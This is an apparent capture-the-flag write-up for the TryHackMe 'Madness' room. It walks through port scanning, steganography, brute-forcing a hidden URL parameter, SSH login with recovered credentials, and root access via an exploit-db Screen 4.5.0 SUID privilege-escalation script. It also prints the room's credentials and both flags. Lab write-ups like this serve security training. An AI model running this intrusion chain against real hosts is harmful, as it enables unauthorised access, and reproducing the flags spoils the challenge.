# Madness - Easy

```shell
rustscan -a 10.10.180.184 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.180.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,bak,php
#no results

file thm.jpg
#shows that it is data, not image

xxd thm.jpg | head -1
#show file header

xxd -r -p -o 0 <(echo ffd8 ffe0 0010 4a46 4946 0001) thm.jpg
#edit file header with jpg magic number

#save header image, given above tasks
steghide extract -sf header.jpg
#extracted password.txt

cat password.txt

sudo vim /etc/hosts
#add madness.thm and map it to IP

steghide extract -sf thm.jpg
#using passphrase "y2RPJ4QaPF!B"

cat hidden.txt
#contains another string

ssh joker@10.10.180.184

cat user.txt

#get linpeas.sh from attacker machine to /tmp, and give it executable permissions
./linpeas.sh

find / -perm -u=s -type f 2>/dev/null

cd /tmp

vim 41154.sh
#copy exploit from exploit-db
#paste it into the file

chmod +x 41154.sh

./41154.sh
#gives root

cat /root/root.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2
  * 80 - http - Apache httpd 2.4.18 (Ubuntu)

Checking the webpage on port 80, it seems to be a default landing page for Apache at first sight.

However, on checking the source code we can see that there is an image file thm.jpg; we can download it and check if it has something in it.

By checking the file header, we can see that the 'magic number' is for a PNG file, not for JPG; we need to edit this with JPG magic number.

After getting the magic numbers from Wikipedia, we can replace it using xxd; this gives us a proper jpg now.

When opened, it gives us a hidden directory clue, /th1s_1s_h1dd3n.

Before checking the directory, we can take a look at the image given above the tasks and conduct stego on that; using steghide, we can see that it contains a file password.txt

The password.txt file includes a password '*axA&GF8dP'; maybe this will come in handy later.

Back to /th1s_1s_h1dd3n, it needs a secret; moreover it is between 0-99, according to the comments in the source code.

After tinkering for a while, I found a way to enter the secret - we need to add a 'secret' parameter to the URL such that it looks like /th1s_1s_h1dd3n/?secret=0

Now we need to figure out the right number, we can use Burp Suite's Intruder for this.

We will have to add the IP of the machine to /etc/hosts and map it to a name for it to work.

Now we need to capture the request for this page, send it to Burp Suite's Intruder, and then brute force using Sniper payload as we need to change only one position (secret parameter).

Filtering by length of response, we can see that when secret=73, we get a response of different length; we can confirm this by using 73 as the value.

This leads us to a clue string "y2RPJ4QaPF!B"

CyberChef does not yield any results; so we will go back to the images we found earlier; we got a password from the header image, we can try stego on thm.jpg as well

Using steghide on thm.jpg with the clue string we found earlier gives us a file hidden.txt

The hidden.txt file contains a string "wbxre".

As we are given a clue hinting towards ROT-encoding, we can try that with CyberChef.

And with ROT-13 decoding, we get the username 'joker'.

So now, we can attempt to SSH with the creds "joker:*axA&GF8dP"; and it works.

After reading user.txt, we can look for privesc using linpeas.sh

We can check that the files with SUID bit set has an additional entry this time; we can verify it as well.
This includes /bin/screen-4.5.0 and /bin/screen-4.5.0-old

Researching on Google, we get an exploit from ExploitDB for local privesc via for Screen 4.5.0 - we can use that.

For some reason, downloading the exploit in SSH does not work, so the workaround is to paste the exploit in a new file in the SSH terminal, then execute it.

Once the Screen-4.5.0 exploit is executed, we get root; root flag can be found in /root/root.txt
```

1. user.txt - THM{d5781e53b130efe2f94f9b0354a5e4ea}

2. root.txt - THM{5ecd98aa66a6abb670184d7547c8124a}
